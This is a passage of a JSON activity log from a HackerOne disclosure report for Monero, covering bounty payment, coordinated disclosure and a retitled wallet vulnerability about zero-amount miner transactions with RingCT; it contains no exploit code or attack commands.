fork.\u003cbr\u003e\nPlease post a monero address if you want to receive a bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-06T20:45:15.264Z","updated_at":"2019-03-06T20:45:15.264Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4284208,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is the Monero address, thank you: 42DxczZbZxLTHnaLiHVEUCRtN5ktLvHy68jm9yWbSiV1KX772AEJf9qUs5tocUWFFs9QLysMBmHM4AbCAkxtHvQbVYowaXu\n\nDid you guys warn any other coins about this issue? If not would you mind if we shoot a short email with link to pull request here and there even before the fork?","markdown_message":"\u003cp\u003eThis is the Monero address, thank you: 42DxczZbZxLTHnaLiHVEUCRtN5ktLvHy68jm9yWbSiV1KX772AEJf9qUs5tocUWFFs9QLysMBmHM4AbCAkxtHvQbVYowaXu\u003c/p\u003e\n\n\u003cp\u003eDid you guys warn any other coins about this issue? If not would you mind if we shoot a short email with link to pull request here and there even before the fork?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T08:54:30.448Z","updated_at":"2019-03-08T08:54:30.448Z","actor":{"username":"cutcoin","cleared":false,"url":"/cutcoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LxfC9tNjvfH1jqTt3oQV2Ncw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4284714,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I don't think this was done. Feel free to tell anyone else about it since the patch is now public. Please leave out the PoC code out for now :)","markdown_message":"\u003cp\u003eI don\u0026#39;t think this was done. Feel free to tell anyone else about it since the patch is now public. Please leave out the PoC code out for now :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T10:44:26.834Z","updated_at":"2019-03-08T10:44:26.834Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4300966,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sent 45 XMR: \u003cac78d12676e4dc04674610cadbbb1fcf00ecab9c40bc8450b2ad4b7408186ef4\u003e","markdown_message":"\u003cp\u003eSent 45 XMR: \u0026lt;ac78d12676e4dc04674610cadbbb1fcf00ecab9c40bc8450b2ad4b7408186ef4\u0026gt;\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-11T15:27:33.052Z","updated_at":"2019-03-11T15:27:33.052Z","actor":{"username":"luigi1111w","cleared":false,"url":"/luigi1111w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4319235,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-13T21:02:41.809Z","updated_at":"2019-03-13T21:02:41.809Z","actor":{"url":"/monero","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Monero"}},"reporter":{"username":"cutcoin","url":"/cutcoin"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4369824,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-21T22:52:10.957Z","updated_at":"2019-03-21T22:52:10.957Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"cutcoin","url":"/cutcoin"},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5242020,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-02T23:49:23.598Z","updated_at":"2019-07-02T23:49:23.598Z","first_to_agree":true,"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5242097,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-03T00:12:36.010Z","updated_at":"2019-07-03T00:12:36.010Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5285555,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-09T23:01:12.039Z","updated_at":"2019-07-09T23:01:12.039Z","additional_data":{"old_title":"Vulnerability that allows an attacker to convince monero-wallet-cli that it received arbitrary amount of monero","new_title":"Zero-amount miner TX + RingCT allows monero wallet to receive arbitrary amount of monero"},"actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}